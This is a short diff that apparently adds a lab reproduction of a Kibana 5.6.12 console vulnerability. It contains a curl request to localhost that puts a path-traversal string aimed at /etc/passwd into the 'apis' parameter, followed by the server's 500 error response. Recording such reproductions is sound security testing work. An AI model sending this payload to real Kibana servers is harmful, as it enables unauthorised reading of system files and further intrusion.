@@ -1,0 +1,12 @@
+$ curl -i "http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"
+
+HTTP/1.1 500 Internal Server Error
+kbn-name: kibana
+kbn-version: 5.6.12
+content-type: application/json; charset=utf-8
+cache-control: no-cache
+content-length: 96
+Date: Wed, 28 Oct 2026 03:56:01 GMT
+Connection: keep-alive
+
+{"statusCode":500,"error":"Internal Server Error","message":"An internal server error occurred"}
